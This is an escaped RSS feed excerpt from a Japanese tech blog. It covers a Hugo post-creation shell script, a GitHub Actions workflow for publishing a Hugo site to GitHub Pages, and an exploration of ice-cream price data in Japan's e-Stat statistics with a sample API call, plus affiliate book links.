&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;ファイルの編集は以下の通りです。&amp;#34;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;vim content/posts/&lt;/span>&lt;span class="nv">$today&lt;/span>&lt;span class="s2">-&lt;/span>&lt;span class="nv">$number&lt;/span>&lt;span class="s2">-&lt;/span>&lt;span class="nv">$author&lt;/span>&lt;span class="s2">/index.md;&amp;#34;&lt;/span>
&lt;span class="o">}&lt;/span>
&lt;span class="c1">#&lt;/span>
&lt;span class="c1"># パラメータの取得&lt;/span>
getParam&lt;span class="p">;&lt;/span>
&lt;span class="c1"># hugoコマンドの実行&lt;/span>
execHugo&lt;span class="p">;&lt;/span>
exit&lt;span class="p">;&lt;/span>
&lt;span class="c1">#&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="おわりに">おわりに&lt;/h2>
&lt;p>日頃、手間を掛けてコマンドを入力している場合は、シェルスクリプトを使って簡便にできる事に加え、さらにカスタマイズを加え、便利に記事投稿ができるとブログも気分もがぜん盛り上がりますね。&lt;/p>
&lt;h2 id="書籍の紹介">書籍の紹介&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4873112672/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4873112672&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=ef087fd92d3628bb94e1eb10cb202d43" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51EAPCH56ML._SL250_.jpg" alt="詳解 シェルスクリプト 大型本 – 2006/1/16">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">詳解 シェルスクリプト 大型本 – 2006/1/16&lt;/h2>
&lt;p>Unixのプログラムは「ツール」と呼ばれます。
Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。
そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。
また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。
つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。
本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。
標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、
目的の処理を実現するための方法を詳しく学ぶことができます。
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797377623/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797377623&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=3c8d4566263ae99374221c4f8f469154" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51R5SZKrEAL._SL250_.jpg" alt="UNIXシェルスクリプト マスターピース132">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">UNIXシェルスクリプト マスターピース132&lt;/h2>
&lt;p>すべてのUNIXエンジニア必携!!
&lt;p>サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。&lt;br>
知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4774186945/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4774186945&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=8ef3ff961c569212e910cf3d6e37dcb6" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41i956UyusL._SL250_.jpg" alt="[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20&lt;/h2>
&lt;p>定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。
シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。
本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、
基本から丁寧に解説。
第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。
合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。
ますますパワーアップした改訂版をお届けします。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797393106/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797393106&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=f514a6378c1c10e59ab16275745c2439" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41d1D6rgDiL._SL250_.jpg" alt="新しいシェルプログラミングの教科書 単行本">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">新しいシェルプログラミングの教科書 単行本&lt;/h2>
&lt;p>エキスパートを目指せ!!
&lt;p>システム管理やソフトウェア開発など、&lt;br>
実際の業務では欠かせないシェルスクリプトの知識を徹底解説&lt;/p>
&lt;p>ほとんどのディストリビューションでデフォルトとなっているbashに特化することで、&lt;br>
類書と差別化を図るとともに、より実践的なプログラミングを紹介します。&lt;br>
またプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。&lt;br>
イマドキのエンジニア必携の一冊。&lt;/p>
&lt;p>▼目次&lt;br>
CHAPTER01 シェルってなんだろう&lt;br>
CHAPTER02 シェルスクリプトとは何か&lt;br>
CHAPTER03 シェルスクリプトの基本&lt;br>
CHAPTER04 変数&lt;br>
CHAPTER05 クォーティング&lt;br>
CHAPTER06 制御構造&lt;br>
CHAPTER07 リダイレクトとパイプ&lt;br>
CHAPTER08 関数&lt;br>
CHAPTER09 組み込みコマンド&lt;br>
CHAPTER10 正規表現と文字列&lt;br>
CHAPTER11 シェルスクリプトの実行方法&lt;br>
CHAPTER12 シェルスクリプトのサンプルで学ぼう&lt;br>
CHAPTER13 シェルスクリプトの実用例&lt;br>
CHAPTER14 テストとデバッグ&lt;br>
CHAPTER15 読みやすいシェルスクリプト&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>GitHub Pagesを使って無料でSSL付きのサイトを公開する</title><link>https://suzukiiichiro.github.io/posts/2021-12-28-hugo-02-ywat/</link><pubDate>Tue, 28 Dec 2021 12:07:19 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2021-12-28-hugo-02-ywat/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2021-12-28-hugo-02-ywat/settings.jpg" alt="Featured image of post GitHub Pagesを使って無料でSSL付きのサイトを公開する" />&lt;p>デザイナーでもできるはじめてのHugoの2回目になります。&lt;br>
&lt;a class="link" href="https://suzukiiichiro.github.io/posts/2021-12-21/" >前回（デザイナーでもできるはじめてのHugo #01）&lt;/a>はHugoのインストールから公開の方法までを説明しました。&lt;br>
今回は前回作成したページをGitHub Pagesを使って公開してみたいと思います。&lt;/p>
&lt;h2 id="github-pages用の設定ファイルを作成">GitHub Pages用の設定ファイルを作成&lt;/h2>
&lt;p>GitHub PagesはGitHubにあるコンテンツを静的ページを公開する機能です。&lt;br>
SSLまでついているので、非常に便利です。&lt;/p>
&lt;p>公開用のファイルは&lt;code>.github/workflows/gh-pages.yml&lt;/code>というYAML形式のファイルになります。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-yaml:.github/workflows/gh-pages.yml" data-lang="yaml:.github/workflows/gh-pages.yml">&lt;span class="nt">name&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">Hugo&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">on&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">push&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># schedule:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># - cron: &amp;#39;*/10 * * * *&amp;#39;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">jobs&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">gh-pages&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">runs-on&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">ubuntu-latest&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">steps&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="nt">name&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">Checkout&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">uses&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">actions/checkout@v2&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">with&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">persist-credentials&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">false&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">submodules&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># Fetch Hugo themes (true OR recursive)&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">fetch-depth&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="m">0&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># Fetch all history for .GitInfo and .Lastmod&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c"># https://github.com/marketplace/actions/github-pages-action&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="nt">name&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">Setup&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">uses&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">peaceiris/actions-hugo@v2&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">with&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">hugo-version&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;latest&amp;#39;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">extended&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="nt">name&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">Build&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">run&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">hugo --minify&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>- &lt;span class="nt">name&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">Deploy&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">uses&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">peaceiris/actions-gh-pages@v3&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">with&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">github_token&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">${{ secrets.GITHUB_TOKEN }}&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">publish_branch&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">gh-pages&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>name&lt;/strong>はGitHubでのActionsに表示される名前です。&lt;br>
今回は公開用として&lt;strong>gh-pages&lt;/strong>というブランチにわけています。ここおらへんはお好みで設定してください。&lt;br>
hugoでテーマを使っている場合は&lt;strong>submodules: true&lt;/strong>とする必要があります。&lt;br>
また、Hugoで更新日をGitの日付と合わせたい場合は&lt;strong>fetch-depth: 0&lt;/strong>として、Gitの履歴を取得するようにしましょう。&lt;/p>
&lt;h2 id="github-pagesの設定">GitHub Pagesの設定&lt;/h2>
&lt;p>GitHub PagesのURLは&lt;code>https://ユーザまたは組織名.github.io/リポジトリ名&lt;/code>となります。&lt;br>
GitHubでリポジトリを作成する際に「ユーザまたは組織名.github.io」とすると「https://ユーザまたは組織名.github.io」とすることができます。&lt;/p>
&lt;p>まずはさきほどのファイルを含めてサイト全体をGitにアップして、gh-pagesというブランチが作られるのを待ちましょう。&lt;br>
その後に、setings &amp;gt; PagesにでGitHub Pagesの設定を行います。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 162;
flex-basis: 390px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2021-12-28-hugo-02-ywat/settings.jpg" data-size="980x603">
&lt;img src="https://suzukiiichiro.github.io/posts/2021-12-28-hugo-02-ywat/settings.jpg"
width="980"
height="603"
loading="lazy"
alt="GitHub Pagesの設定"
>
&lt;/a>
&lt;/a>
&lt;figcaption>GitHub Pagesの設定&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>Your GitHub Pages site is currently being built from the gh-pages branch&lt;br>
にあるBranchをgh-pagesに変更します。&lt;br>
設定は以上です。&lt;/p>
&lt;p>Hugoの初期設定であれば&lt;code>publishDir: public&lt;/code>となっているので、GitHub Pagesではpublicがルートディレクトリとして公開されます。&lt;br>
.gitignoreに「public」を除外するようにしておきましょう。&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-:.gitignore" data-lang=":.gitignore">/public
/resources
&lt;/code>&lt;/pre>&lt;p>最後に設定したURLへアクセスするとサイトが確認できると思います。&lt;/p>
&lt;h2 id="まとめ">まとめ&lt;/h2>
&lt;p>GitHub Pagesを使えば、難しいサーバの設定などをすることなく、無料でSSL付きのサイトを公開することが可能です。&lt;br>
いくつかの制限はありますが、すごく便利な機能なのでみなさんもぜひ使ってみてはいかがでしょうか。&lt;/p>
&lt;p>公開する際はパスワードなどの情報も一緒にアップしないよう、気をつけてください。&lt;/p>
&lt;h2 id="オススメの書籍">オススメの書籍&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/B07LBSWJNP/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=B07LBSWJNP&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=fd3f2918d16f32f53feccf492263133a" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="//m.media-amazon.com/images/I/51SRr41G-ZL._SL250_.jpg" alt="いちばんやさしいGit&amp;amp;GitHubの教本 人気講師が教えるバージョン管理＆共有入門 「いちばんやさしい教本」シリーズ">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">いちばんやさしいGit&amp;amp;GitHubの教本 人気講師が教えるバージョン管理＆共有入門 「いちばんやさしい教本」シリーズ&lt;/h2>
&lt;p>実際のワークフローをイメージしながら
実践的なGit/GitHubの使い方が身につく「いちばんやさしい」入門書です。
前半は、手元のパソコンでファイルを実際にバージョン管理しながら、
Gitの基本的な使い方を解説。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/Web%E5%88%B6%E4%BD%9C%E8%80%85%E3%81%AE%E3%81%9F%E3%82%81%E3%81%AEGitHub%E3%81%AE%E6%95%99%E7%A7%91%E6%9B%B8-%E3%83%81%E3%83%BC%E3%83%A0%E3%81%AE%E5%8A%B9%E7%8E%87%E3%82%92%E6%9C%80%E5%A4%A7%E5%8C%96%E3%81%99%E3%82%8B%E5%85%B1%E5%90%8C%E9%96%8B%E7%99%BA%E3%83%84%E3%83%BC%E3%83%AB-%E5%A1%A9%E8%B0%B7-%E5%95%93/dp/4844337009?__mk_ja_JP=%E3%82%AB%E3%82%BF%E3%82%AB%E3%83%8A&amp;amp;crid=3C1ZNYZB4N0C3&amp;amp;keywords=github&amp;amp;qid=1640665205&amp;amp;sprefix=github%2Caps%2C284&amp;amp;sr=8-8&amp;amp;linkCode=ll1&amp;amp;tag=nlpqueens-22&amp;amp;linkId=65876fc9d77e695d11f02ec867bc8c4a&amp;amp;language=ja_JP&amp;amp;ref_=as_li_ss_tl" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="//m.media-amazon.com/images/I/51wTwJndWVL._SL250_.jpg" alt="Web制作者のためのGitHubの教科書 チームの効率を最大化する共同開発ツール">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">Web制作者のためのGitHubの教科書 チームの効率を最大化する共同開発ツール&lt;/h2>
&lt;p>そろそろ「プルリ」しませんか?しくみを理解して使えば怖くない。リポジトリの作成から複数デザインの提示、「Pull Request」を使った分担作業まで、Webサイト制作を例に実践的なワークフローを身に付ける。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>e-Statで面白いデータを探そう。ランキング上位「アイスクリーム」ってなんだ？</title><link>https://suzukiiichiro.github.io/posts/2021-12-26-01-ani/</link><pubDate>Sun, 26 Dec 2021 21:54:39 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2021-12-26-01-ani/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2021-12-26-01-ani/anal.jpg" alt="Featured image of post e-Statで面白いデータを探そう。ランキング上位「アイスクリーム」ってなんだ？" />&lt;p>私のe-Statでのデータマイニングの現在の目的は以下の通りです&lt;br>
大量の政府公開データの中から&lt;br>
①面白そうなデータをピックアップする&lt;br>
②データをわかりやすくサマライズする&lt;br>
　・列情報などを必要な項目に絞り込む&lt;br>
　・前年度比５倍とか急激な変化があった場合をピックアップできるようにする&lt;br>
最終的にはこれらを自動でできるようにしたいです。&lt;/p>
&lt;p>今回は、まず①面白そうなデータをピックアップすることを目的にe-Statを見てみましょう。&lt;/p>
&lt;h2 id="ランキングページを見てみよう">ランキングページを見てみよう&lt;/h2>
&lt;p>e-Statのトップページ（https://www.e-stat.go.jp/）の画面の下の方にランキングという欄があります。&lt;br>
そのランキングの現在(2021/12/26)３位が「アイスクリーム」なんです。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 149;
flex-basis: 358px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2021-12-26-01-ani/ranking.png" data-size="980x656">
&lt;img src="https://suzukiiichiro.github.io/posts/2021-12-26-01-ani/ranking.png"
width="980"
height="656"
loading="lazy"
alt="ランキング"
>
&lt;/a>
&lt;/a>
&lt;figcaption>ランキング&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;h2 id="アイスクリームが含まれるのはどんなデータか">アイスクリームが含まれるのはどんなデータか&lt;/h2>
&lt;p>「アイスクリーム」は柔らかめのキーワードなので面白いデータの予感がします。&lt;br>
「アイスクリーム」が含まれるデータはどんなデータなんでしょうか？&lt;br>
ちょっと見てみましょう。&lt;/p>
&lt;p>&lt;a class="link" href="https://www.e-stat.go.jp/stat-search?page=1&amp;amp;query=%E3%82%A2%E3%82%A4%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%BC%E3%83%A0&amp;amp;layout=dataset" target="_blank" rel="noopener"
>https://www.e-stat.go.jp/stat-search?page=1&amp;query=%E3%82%A2%E3%82%A4%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%BC%E3%83%A0&amp;layout=dataset&lt;/a>&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 143;
flex-basis: 343px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2021-12-26-01-ani/iceweblist.png" data-size="980x685">
&lt;img src="https://suzukiiichiro.github.io/posts/2021-12-26-01-ani/iceweblist.png"
width="980"
height="685"
loading="lazy"
alt="アイスクリーム"
>
&lt;/a>
&lt;/a>
&lt;figcaption>アイスクリーム&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>「アイスクリーム」が含まれるデータは7640件あるみたいです。&lt;br>
ちょっと多いですね。。。&lt;br>
検索条件なのですが、提供分類、表題を検索　データベース、ファイル内を検索にチェックがついています。&lt;br>
「検索のしかた」をみてみるとキーワードのOR検索やAND検索もできそうです。&lt;br>
&lt;figure
class="gallery-image"
style="
flex-grow: 134;
flex-basis: 323px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2021-12-26-01-ani/icewebsearchmethod.png" data-size="980x727">
&lt;img src="https://suzukiiichiro.github.io/posts/2021-12-26-01-ani/icewebsearchmethod.png"
width="980"
height="727"
loading="lazy"
alt="検索のしかた"
>
&lt;/a>
&lt;/a>
&lt;figcaption>検索のしかた&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>ちなみに検索キーワードでの絞り込みはAPI(統計表情報取得)でももちろんできます。&lt;/p>
&lt;pre tabindex="0">&lt;code>curl &amp;quot;https://api.e-stat.go.jp/rest/3.0/app/getSimpleStatsList?appId=xxxxxxxxxx&amp;amp;searchWord=アイスクリーム&amp;quot;
&lt;/code>&lt;/pre>&lt;p>アイスクリームだと数が多すぎるので試しに「ガリガリ君」で検索してみましたが、0件でした。「ハーゲンダッツ」で検索したところ22件引っかかってきました。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 168;
flex-basis: 405px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2021-12-26-01-ani/hagenlist.png" data-size="980x580">
&lt;img src="https://suzukiiichiro.github.io/posts/2021-12-26-01-ani/hagenlist.png"
width="980"
height="580"
loading="lazy"
alt="ハーゲンダッツ"
>
&lt;/a>
&lt;/a>
&lt;figcaption>ハーゲンダッツ&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>「ハーゲンダッツ」どこに出てくるのかなと思ってAPIを一通り叩いてみたのですがAPIの実行結果からは「ハーゲンダッツ」は見つけられませんでした。&lt;br>
エクセル表示を見てみたところ、「銘柄」という項目に「バニラアイスクリーム，カップ入り（110mL入り），「ハーゲンダッツ バニラ」」とありました。&lt;br>
どうも全国のアイスクリームの価格を「ハーゲンダッツ　バニラ」を基準に算出しているみたいです。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 188;
flex-basis: 453px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2021-12-26-01-ani/icedetail1excel.png" data-size="980x519">
&lt;img src="https://suzukiiichiro.github.io/posts/2021-12-26-01-ani/icedetail1excel.png"
width="980"
height="519"
loading="lazy"
alt="excel"
>
&lt;/a>
&lt;/a>
&lt;figcaption>excel&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>ちなみに、2020年だと１番安いのが長野市の221円で１番高いのが那覇市の300円でした。&lt;br>
&lt;figure
class="gallery-image"
style="
flex-grow: 199;
flex-basis: 479px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2021-12-26-01-ani/icedetail1rst.png" data-size="980x491">
&lt;img src="https://suzukiiichiro.github.io/posts/2021-12-26-01-ani/icedetail1rst.png"
width="980"
height="491"
loading="lazy"
alt="統計表"
>
&lt;/a>
&lt;/a>
&lt;figcaption>統計表&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>単にハーゲンダッツの価格ってだけだと少しパンチ力弱いかもしれませんね。。。&lt;/p>
&lt;p>個人的には明治のスーパーカップが１位でジャンボモナカが２位でとかアイスクリーム売れ筋ランキングとかの方が楽しいのですが、政府はそこまで調べてくれないですよね。&lt;/p>
&lt;h2 id="小売統計調査とは">小売統計調査とは&lt;/h2>
&lt;p>小売物価統計調査はお米の価格から葬儀代まで約８００の小売価格を調査したデータ&lt;br>
調査結果は、年金等の給付見直しの際の基礎資料や、公共料金の上限値を決める際の資料として、幅広く利用されているそうです。&lt;br>
アイスクリームは約８００ある中の項目の一つです。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 178;
flex-basis: 429px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2021-12-26-01-ani/icedetail1column.png" data-size="980x548">
&lt;img src="https://suzukiiichiro.github.io/posts/2021-12-26-01-ani/icedetail1column.png"
width="980"
height="548"
loading="lazy"
alt="銘柄"
>
&lt;/a>
&lt;/a>
&lt;figcaption>銘柄&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>小売物価統計調査をピックアップするとしたら、ここ数年で値段が大きく変化しているものや地域間の差が特に大きいものとかですかね。&lt;/p>
&lt;p>「小売物価統計」でgoogle検索して面白そうな記事を見てみると&lt;br>
「今年のX’マスケーキは小さくなるか」という記事がありました。&lt;/p>
&lt;p>ケーキにもよく使われる小麦や油量種子はとりわけ高騰が目立つ&lt;br>
→&lt;br>
小売物価統計調査によると、東京都区部の小売価格で、今年11月の1kgあたりの小麦価格は1年前より約20円上昇した。食用油に至っては1kgあたり約60円と大幅な値上がりで、価格が比較的安定している食品の代名詞ともなってきた鶏卵でさえ、1パックあたり約12円上昇した。&lt;br>
→&lt;br>
クリスマスイブにケーキを買って帰る人も多いだろうが、今年は例年と比べて値段がほとんど同じなのにサイズが小さくなっていても不思議ではない。&lt;/p>
&lt;p>こんな感じのものは自動的にピックアップできると理想的なんですけどね。&lt;/p>
&lt;h2 id="今日のところのまとめ">今日のところのまとめ&lt;/h2>
&lt;p>自動的にピックアップするとしたら&lt;br>
・柔らかめのキーワード&lt;br>
・ここ数年間で値が急激に変化してるもの&lt;br>
・地域間の格差が大きいもの&lt;br>
ですかね。データを見ていって判定項目を増やしていきたいと思います。&lt;/p>
&lt;p>その他、アイスクリームでの検索結果には「家計調査」というのもありました。&lt;br>
家計の４半期での支出額の平均を出したものなのですが、アイスクリームの支出は当然夏が冬の倍くらい多い感じになってます。&lt;/p>
&lt;p>アイスクリームは当たり前ですが、その他季節によって大きく支出が違うものって何なのかは少し興味がありますね。&lt;br>
毎月や四半期ごとに値があるものについては、期間によって差が大きいものはピックアップしても良いかもしれませんね。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 116;
flex-basis: 280px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2021-12-26-01-ani/kakei.png" data-size="980x840">
&lt;img src="https://suzukiiichiro.github.io/posts/2021-12-26-01-ani/kakei.png"
width="980"
height="840"
loading="lazy"
alt="家計調査"
>
&lt;/a>
&lt;/a>
&lt;figcaption>家計調査&lt;/figcaption>
